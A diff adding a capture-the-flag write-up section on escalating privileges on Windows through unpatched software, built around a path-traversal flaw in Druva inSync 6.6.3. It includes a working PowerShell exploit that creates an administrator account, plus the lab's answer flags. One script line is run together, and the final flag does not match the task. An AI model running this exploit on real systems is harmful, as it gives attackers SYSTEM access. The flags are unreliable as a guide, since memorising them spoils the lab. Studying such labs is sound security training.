@@ -307,3 +307,47 @@ Now we only need to find the flag on the Administrator’s Desktop:
 #### Answer: THM{SEFLAGPRIVILEGE}
 
 ## Task 7: Abusing vulnerable software
+**Unpatched Software and Privilege Escalation**
+- Software installed on a target system can present opportunities for privilege escalation, especially if it is outdated. Users often neglect updates for software, making it a potential target.
+- You can use the `wmic` command to list installed software and versions (wmic product get name,version,vendor), although not all programs may show up. It’s important to check other traces of software, like shortcuts or services.
+- Once you gather the software’s version, online resources (e.g., exploit-db, Google) can be used to find known vulnerabilities for any installed products.
+
+**Case Study: Druva inSync 6.6.3**
+- Vulnerability: The target system runs Druva inSync 6.6.3, which has a privilege escalation vulnerability related to an RPC server running on port 6064 with SYSTEM privileges, only accessible from localhost. The vulnerability stems from a flawed patch after an earlier issue with version 6.5.0.
+- Cause: Procedure 5 in the RPC service allows arbitrary command execution. While a patch was issued to restrict commands to a specific path (C:\ProgramData\Druva\inSync4\), a path traversal attack could bypass this restriction, allowing execution of arbitrary commands (e.g., C:\Windows\System32\cmd.exe).
+
+**Exploit:**
+- The exploit involves sending packets to the RPC service to execute a command. A PowerShell script is provided that connects to the vulnerable service and sends a crafted request to execute commands with SYSTEM privileges.
+- The default payload adds a user (pwnd) without administrative rights, but the script can be modified to elevate the user to an administrator by running the following commands: net user pwnd SimplePass123 /add net localgroup administrators pwnd /add
+- After executing the exploit, the new user can run commands with administrative privileges and retrieve the flag from the Administrator’s desktop.
+
+### Q: Get the flag on the Administrator’s desktop.
+The theory mentions the following exploit one line after one:
+```
+$ErrorActionPreference = "Stop"
+$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
+$s.Connect("127.0.0.1", 6064)$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+All we need to do is run this exploit on the target machine in a Powershell console.
+
+The exploit will create user pwnd with a password of **SimplePass123** and add it to the administrators’ group. If the exploit was successful, we should be able to run the following command to verify that the user exists and is part of the administrators’ group:
+```net user pwnd```
+![net command to check our permissions](images/net_user_pwnd.png)
+
+This is the case. Now we can run a command prompt as administrator. When prompted for credentials, use the pwnd account.
+![CMD with pwnd user](images/more_choice_pwnd.png)
+
+From the new command prompt, we can retrieve your flag from the **Administrator’s** desktop with the following command:
+```type C:\Users\Administrator\Desktop\flag.txt```
+
+![Readning flag](images/pwnd_flag.png)
+
+#### Answer: THM{EZ_DLL_PROXY_4ME}
